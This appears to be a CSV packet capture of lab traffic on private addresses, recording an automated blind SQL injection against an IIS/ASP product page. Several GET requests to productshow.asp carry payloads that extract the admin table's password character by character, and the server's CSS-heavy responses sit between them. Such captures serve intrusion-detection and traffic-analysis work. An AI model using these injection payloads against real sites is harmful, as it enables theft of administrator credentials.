dst_port,ip_dst,ip_src,msg,src_port,timestamp
56840,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:50 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 37030
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2)",80,2019/03/24 15:35:50.739642
80,192.168.244.136,192.168.244.1,,56840,2019/03/24 15:35:50.739929
80,192.168.244.136,192.168.244.1,,56840,2019/03/24 15:35:50.739951
80,192.168.244.136,192.168.244.1,,56840,2019/03/24 15:35:50.741147
80,192.168.244.136,192.168.244.1,,56840,2019/03/24 15:35:50.741159
80,192.168.244.136,192.168.244.1,,56842,2019/03/24 15:35:50.741164
56842,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.741178
80,192.168.244.136,192.168.244.1,,56842,2019/03/24 15:35:50.741427
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),8,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2051%20and%2051 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56842,2019/03/24 15:35:50.741453
56841,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:50 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:50.786602
80,192.168.244.136,192.168.244.1,,56841,2019/03/24 15:35:50.787531
80,192.168.244.136,192.168.244.1,,56841,2019/03/24 15:35:50.787573
80,192.168.244.136,192.168.244.1,,56841,2019/03/24 15:35:50.788871
80,192.168.244.136,192.168.244.1,,56841,2019/03/24 15:35:50.788886
80,192.168.244.136,192.168.244.1,,56843,2019/03/24 15:35:50.789046
56843,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.789063
80,192.168.244.136,192.168.244.1,,56843,2019/03/24 15:35:50.789344
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),2,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2054%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56843,2019/03/24 15:35:50.789357
56842,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:50 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 37030
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2)",80,2019/03/24 15:35:50.850236
80,192.168.244.136,192.168.244.1,,56842,2019/03/24 15:35:50.850412
80,192.168.244.136,192.168.244.1,,56842,2019/03/24 15:35:50.850426
80,192.168.244.136,192.168.244.1,,56842,2019/03/24 15:35:50.851539
80,192.168.244.136,192.168.244.1,,56842,2019/03/24 15:35:50.851549
80,192.168.244.136,192.168.244.1,,56844,2019/03/24 15:35:50.851575
56844,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.851586
80,192.168.244.136,192.168.244.1,,56844,2019/03/24 15:35:50.851721
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),13,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2048%20and%2050 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56844,2019/03/24 15:35:50.851876
56843,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.926967
56843,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:50 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 37030
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2)",80,2019/03/24 15:35:50.927507
80,192.168.244.136,192.168.244.1,,56843,2019/03/24 15:35:50.927734
80,192.168.244.136,192.168.244.1,,56843,2019/03/24 15:35:50.927745
80,192.168.244.136,192.168.244.1,,56843,2019/03/24 15:35:50.928729
80,192.168.244.136,192.168.244.1,,56843,2019/03/24 15:35:50.928754
80,192.168.244.136,192.168.244.1,,56845,2019/03/24 15:35:50.929010
56845,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.929023
80,192.168.244.136,192.168.244.1,,56845,2019/03/24 15:35:50.929165
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),9,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2048%20and%2048 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56845,2019/03/24 15:35:50.929314
56844,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:50 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:50.974094
80,192.168.244.136,192.168.244.1,,56844,2019/03/24 15:35:50.974547
80,192.168.244.136,192.168.244.1,,56844,2019/03/24 15:35:50.974557
80,192.168.244.136,192.168.244.1,,56844,2019/03/24 15:35:50.975330
80,192.168.244.136,192.168.244.1,,56844,2019/03/24 15:35:50.975351
80,192.168.244.136,192.168.244.1,,56846,2019/03/24 15:35:50.975518
56846,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.975535
80,192.168.244.136,192.168.244.1,,56846,2019/03/24 15:35:50.975763
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),14,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2055%20and%2058 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56846,2019/03/24 15:35:50.975782
56845,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:51 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:51.021737
80,192.168.244.136,192.168.244.1,,56845,2019/03/24 15:35:51.021994
80,192.168.244.136,192.168.244.1,,56845,2019/03/24 15:35:51.022004
80,192.168.244.136,192.168.244.1,,56845,2019/03/24 15:35:51.022970
80,192.168.244.136,192.168.244.1,,56845,2019/03/24 15:35:51.022983
80,192.168.244.136,192.168.244.1,,56847,2019/03/24 15:35:51.023128
56847,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:51.023145
80,192.168.244.136,192.168.244.1,,56847,2019/03/24 15:35:51.023368
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),15,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%20100%20and%20102 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56847,2019/03/24 15:35:51.023381
